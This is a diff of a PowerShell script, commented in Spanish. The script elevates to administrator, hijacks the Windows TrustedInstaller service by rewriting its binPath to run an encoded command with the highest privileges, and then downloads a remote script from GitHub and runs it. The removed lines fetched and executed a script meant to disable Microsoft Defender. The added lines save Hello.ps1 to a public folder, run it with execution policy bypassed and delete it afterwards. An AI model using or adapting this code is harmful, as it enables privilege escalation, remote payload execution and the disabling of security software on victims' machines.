@@ -1,4 +1,4 @@
-# Verificar si se ejecuta como administrador; si no, relanzar con privilegios elevados
+# Verificar si se ejecuta como administrador
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
   Write-Host "No se ejecuta como administrador. Relanzando con privilegios elevados..."
   Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
@@ -19,7 +19,7 @@ function Run-Trusted([String]$command) {
     sc.exe config TrustedInstaller binPath= "cmd.exe /c powershell.exe -encodedcommand $base64Command" | Out-Null
     Write-Host "Iniciando TrustedInstaller..."
     sc.exe start TrustedInstaller | Out-Null
-    Start-Sleep -Seconds 2 # Esperar a que el comando se ejecute
+    Start-Sleep -Seconds 5 # Aumentar espera para descargas
     Write-Host "Restaurando binPath original..."
     sc.exe config TrustedInstaller binpath= "`"$DefaultBinPath`"" | Out-Null
     Stop-Service -Name TrustedInstaller -Force -ErrorAction Stop
@@ -28,15 +28,20 @@ function Run-Trusted([String]$command) {
   }
 }
 
-# Comando para descargar y ejecutar Hello.ps1
+# Comando para descargar, guardar y ejecutar Hello.ps1
 $executeCommand = @"
 try {
-  Write-Host 'Descargando Hello.ps1...'
-  \$scriptContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zoicware/DefenderProTools/main/DisableDefender.ps1' -UseBasicParsing -ErrorAction Stop
+  Write-Host 'Descargando Hello.ps1 a C:\Users\Public...'
+  New-Item -Path 'C:\Users\Public' -ItemType Directory -Force
+  Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Angel-Rojas-ING/TEST/main/Hello.ps1' -OutFile 'C:\Users\Public\Hello.ps1' -UseBasicParsing -ErrorAction Stop
+  Write-Host 'Contenido de Hello.ps1:'
+  Get-Content 'C:\Users\Public\Hello.ps1' | Write-Host
   Write-Host 'Ejecutando Hello.ps1...'
-  Invoke-Expression \$scriptContent.Content
+  powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'C:\Users\Public\Hello.ps1'
+  Write-Host 'Ejecución finalizada.'
+  Remove-Item 'C:\Users\Public\Hello.ps1' -Force -ErrorAction SilentlyContinue
 } catch {
-  Write-Host 'Error al descargar o ejecutar Hello.ps1: \$_'
+  Write-Host 'Error al descargar o ejecutar Hello.ps1: $_'
 }
 "@
 
